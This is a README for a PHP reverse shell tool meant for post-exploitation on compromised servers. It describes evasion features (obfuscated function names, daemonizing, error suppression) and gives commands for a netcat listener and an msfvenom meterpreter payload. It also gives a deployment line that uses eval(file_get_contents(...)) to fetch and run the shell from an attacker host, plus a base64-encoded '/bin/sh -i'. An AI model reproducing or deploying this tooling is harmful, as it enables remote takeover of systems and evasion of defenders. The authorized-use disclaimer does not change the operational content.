# Advanced & Modernized PHP Reverse Shell

A lightweight, configurable reverse shell implementation in PHP designed for post-exploitation scenarios. This script establishes a reverse connection from a compromised target to an attacker-controlled listener, enabling remote command execution with optional encryption and stealth features.

> [!warning]
> **Note:** This tool is intended for educational purposes, penetration testing, and authorized security assessments only. Unauthorized use against systems without explicit permission is illegal and unethical. The author of this tool is not liable for any _unauthorized_ or _illegal_ operations done with said tool.

---

## Features

- **Reverse TCP Connection**: Connects back to a specified IP and port.
- **Encryption Support**: AES-256-GCM encryption using OpenSSL (disabled automatically if extension is missing).
- **Stealth Enhancements**:
  - Daemonizes the process (via `pcntl_fork` and `posix_setsid`).
  - Obfuscated internal function calls using base64-encoded names.
- **Metasploit Compatibility**: Optional mode to receive and execute a Metasploit second-stage payload.
- **System Recon**: Automatically gathers and sends basic system information upon connection.
- **Cross-Platform**: Uses adaptive commands for network interface enumeration (`ifconfig` or `ip a`).

---

## Configuration

Edit the following variables at the top of the script:

```php
private $__ip = '{RHOST}';              // Attacker's IP address
private $__port = {RPORT};              // Listener port
private $__shell_cmd = 'L2Jpbi9zaCAtaQ=='; // Base64 of '/bin/sh -i'
private $__use_encryption = true;       // Enable or disable AES encryption
private $__metasploit_mode = false;     // Set to true when using msfvenom payloads
private $__gather_info = true;          // Whether to send initial system info
```

> Ensure your encryption key in the constructor is exactly 32 bytes:
> ```php
> public function __construct($encryption_key = 'your_super_secret_32_byte_key!!') {
> ```

---

## Usage

### 1. Start a Listener

#### For standard shell (Netcat style):
```bash
nc -lvnp 4444
```

#### For encrypted shells:
Use a custom decrypting listener or modify this script to log decrypted output during testing.

> Example Python decrypting listener available upon request (ensure matching AES-GCM settings).

### 2. Deploy the Payload

Upload and execute on the target via vulnerable parameter (e.g., file upload, LFI, RCE):

```bash
curl http://target.com/shell.php
```

Alternatively, include inline in exploit:
```php
<?php eval(file_get_contents('http://attacker.com/reverse_shell.php')); ?>
```

### 3. Interact

Once connected, you'll receive an interactive shell prompt (or Metasploit session if `__metasploit_mode = true`.

---

## Metasploit Integration

To use with `msfvenom`:

```bash
msfvenom -p php/meterpreter/reverse_tcp LHOST=YOUR_IP LPORT=4444 -f raw > shell.php
```

Then set:
```php
private $__metasploit_mode = true;
```

And trigger the script — it will automatically read the stage length prefix and execute the Meterpreter payload in memory.

---

## Detection & Evasion

- Function names are stored as base64 to evade basic signature detection.
- Uses `@` error suppression for anti-debugging.
- Forks into background by default.
- No reliance on `exec()`, `system()`, etc. — uses `proc_open()` for better control.

**Note:** Advanced defenses (e.g., EDR, PHP hooks, logging) may still detect this activity.

---

## Cleanup

The script performs cleanup on exit:
- Closes all pipes and socket.
- Terminates subprocess cleanly.
- Daemonized children do not leave traces on parent.

---

## Author

- **J4ck3LSyN**
- Version: `0.6.0`

---
> [!warning]
> Test thoroughly in controlled environments before operational use.
```
